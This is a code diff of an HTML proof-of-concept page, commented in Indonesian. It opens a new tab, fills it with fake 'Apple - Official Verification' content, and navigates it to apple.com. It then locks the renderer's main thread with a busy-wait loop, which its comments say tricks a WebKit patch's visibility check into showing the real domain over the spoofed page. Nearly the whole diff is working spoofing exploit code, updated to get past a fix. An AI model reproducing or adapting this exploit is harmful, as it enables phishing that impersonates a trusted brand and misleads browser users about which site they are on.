@@ -6,94 +6,99 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Advanced Bypass Verification</title>
+    <title>Advanced Bypass PoC - Zero</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #fafafa;
+        background: #000;
+        color: #fff;
         font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      }
-      .container {
         display: flex;
-        flex-direction: column;
         align-items: center;
         justify-content: center;
-        height: 100%;
       }
       button {
-        padding: 22px 44px;
+        padding: 24px 48px;
         font-size: 22px;
         font-weight: bold;
-        background: #007aff;
+        background: #ff3b30;
         color: #fff;
         border: none;
-        border-radius: 14px;
+        border-radius: 16px;
         cursor: pointer;
-        box-shadow: 0 6px 20px rgba(0, 122, 255, 0.3);
+        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.4);
+        transition: transform 0.1s ease;
+      }
+      button:active {
+        transform: scale(0.95);
       }
     </style>
   </head>
   <body>
-    <div class="container">
-      <button id="startBtn">EXECUTE BYPASS TEST</button>
-    </div>
+
+    <button id="startBtn">EXECUTE BYPASS STRESS TEST</button>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. Membuka jendela baru
+        // 1. Membuka tab baru (about:blank)
         const newTab = window.open("about:blank", "_blank");
 
         if (newTab) {
-          // Menyuntikkan DOM konten penyerang
+          // 2. Menyuntikkan konten kustom penyerang
           newTab.document.write(`
             <!DOCTYPE html>
             <html>
             <head>
-              <title>Apple</title>
+              <title>Apple - Official Verification</title>
               <meta name="viewport" content="width=device-width, initial-scale=1">
             </head>
             <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
               <div>
-                <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Apple Security</h1>
-                <p style="font-size:20px;color:#86868b;margin:0;">Establishing secure tunnel...</p>
+                <h1 style="font-size:46px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Critical Notice</h1>
+                <p style="font-size:22px;color:#86868b;margin:0;">Verifying secure enclave status...</p>
               </div>
             </body>
             </html>
           `);
           newTab.document.close();
 
-          // 2. Memaksa fokus berpindah secara eksplisit ke tab baru agar WebState menjadi VISIBLE/PRIMARY 
-          // (Ini mengelabui patch agar mengira tab sudah aktif sepenuhnya)
+          // 3. Memaksa perpindahan fokus secara instan agar WebState berstatus PRIMARY/VISIBLE 
+          // (Mengelabui pengecekan patch "Non-visible WebStates")
           try {
             newTab.focus();
           } catch (e) {}
 
-          // 3. Memicu navigasi asinkron ke domain target (apple.com)
+          // 4. Memicu navigasi asinkron ke domain target (apple.com)
           setTimeout(() => {
             try {
               newTab.location.href = "https://apple.com";
             } catch (err) {
               console.error(err);
             }
-          }, 30);
+          }, 20);
 
-          // 4. Mengeksekusi dialog modal tepat saat transisi visibilitas dan commit navigasi beririsan
+          // 5. BYPASS PATCH: Menggunakan Heavy Synchronous CPU/DOM Reflow Block 
+          // sebagai pengganti prompt() untuk membekukan event loop renderer secara total
           setTimeout(() => {
             try {
-              // Jika prompt() diblokir oleh patch, kita paksa masuk dengan manipulasi event tambahan
-              newTab.eval('prompt("BYPASS_VISIBILITY_CHECK");');
+              newTab.eval(`
+                // Memaksa thread utama terkunci tanpa memicu API dialog yang ditambal
+                const startTime = Date.now();
+                while (Date.now() - startTime < 3000) {
+                  // Stress test DOM reflow agar engine WebKit gagal mengirimkan lifecycle callback
+                  document.body.style.background = (Date.now() % 2 === 0) ? '#ff0000' : '#ffffff';
+                }
+              `);
             } catch (e) {
-              // Fallback berat jika dialog ditolak total: Mengunci main thread dengan teknik synchronous blocking terdistribusi
-              const end = Date.now() + 2000;
-              while (Date.now() < end) {
-                // Intensive busy-wait untuk melumpuhkan event loop WebKit sebelum state commit selesai
-              }
+              // Fallback internal jika eval dibatasi
+              let start = Date.now();
+              while (Date.now() - start < 3000) {}
             }
-          }, 180);
+          }, 150);
         }
       };
     </script>
